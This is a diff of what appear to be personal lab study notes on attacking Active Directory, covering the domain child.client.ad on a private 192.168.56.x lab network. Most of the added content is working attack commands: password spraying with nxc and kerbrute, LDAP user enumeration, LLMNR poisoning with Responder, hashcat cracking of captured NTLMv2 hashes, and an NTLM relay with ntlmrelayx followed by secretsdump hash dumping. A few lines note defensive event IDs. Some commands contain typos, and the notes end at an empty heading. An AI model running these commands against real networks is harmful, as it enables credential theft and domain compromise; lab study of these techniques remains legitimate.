@@ -56,7 +56,8 @@ nxc smb 192.168.56.10 -u service-accts.txt -p Password123!
 - event ID 4625 - account failed to logon.
 
 SMB vs Kerberos Spraying:
-Kerberos - fast, UDP, no TCP overhead, less noise - only 2 frames to check password, failed kerberos pre-authentication does not trigger a Logon failure event (4625), need to manually configure DC for kerbes login event logging (event 4771: Kerberos pre-authentication)
+Kerberos - fast, UDP, no TCP overhead, less noise - only 2 frames to check password, failed kerberos pre-authentication does not trigger a Logon failure event (4625), 
+need to manually configure DC for kerbes login event logging (event 4771: Kerberos pre-authentication)
 
 nxc smb 192.168.56.10 -u service-accts.txt -p Password123! -d child.client.ad
 Wireshark filters: 
@@ -78,6 +79,64 @@ nxc smb 192.168.56.11 -u 'bill.gates' -p 'Password123!" -d child.client.ad
 nxc smb 192.168.56.11 -u 'bill.gates' -p 'Password123!" -d child.client.ad --users
 
 impacket-GetADUsers -all 'child.client.ad/bill.gates:Password123!'
+
+cat test.txt | cut -d " " -f1 | sort -u > adusers.child
+
+ldapsearch -H ldap://191.68.56.11 -D "bill.gates@child.client.ad" -w 'Password123!' -b 'DC=child,DC=client,DC=ad' "&(objectCategory=person)(objectClass=user))" | grep 'distringuishedName:'
+use below again to check the password with new users:
+kerbrute -users adusers.child -password 'Password123!' -domain child.client.ad
+
+Protocol abuse:NBMS/LLMNR:
+LLMNR - is used to allow hosts to perform name resolution for hosts on the same local network without requiring a DNS server.
+LLMNR - is used when DNS fails to resolve a host
+If LLMNR fails, then NetBIOS requests will be sent.
+- this allows us to capture password hashes (NTLMv1/v2, etc) or in same cases clear text credentials (MSSQL, HTTP, etc).
+
+Abusing LLMNR with Responder:
+python Responder.py -I eth0 -wdvb
+- found credentials use them for hashcat:
+hashcat -m 5600 resp.hashes -o resp.cracked /usr/share/wordlists/rockyou.txt -r /opt/OneRuleToRuleThemAll.rule --force
+- if you want to exclude your host IP, add in the Responder.conf under "Don't RespondTo= " the IP you want to exclude. You can also add the IPv6 IP address there as well.
+
+Cracking Responder Hashes with Hashcat:
+hashcat -m 5600 resp.hashes -o resp.cracked /usr/share/wordlists/rockyou.txt -r /opt/OneRuleToRuleThemAll.rule --force
+hashcat -m 5600 --show resp.hashes
+
+NTLM Relay 101:
+(Protocol abuse - NTLM Relay)
+- NTLM is the successor to the authentication protocol in the MS LAN Manager (LANMAN)
+- Negotiate_message <-Challenge_message -> Authenticate_message
+
+NTLM Relay Attack with NetExec, Responder and Impacket:
+nxc smb 192.168.56.0/24 --gen-relay-listsmb-signing-off.txt
+(some servers will not have the Signing enabled for SMBv1).
+- modify Responder.conf and turn off SMB and HTTP.
+impacket-ntlmrelayx -tf smb-signing-off.txt -of SAMhashes -smb2support -socks
+
+proxychains impacket-secretdump -no-pass 'child/idi.amin@192.168.56.31'
+proxychains impacket-secretdump -no-pass 'child/idi.amin@192.168.56.22'
+
+AS-REP Roasting 101:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
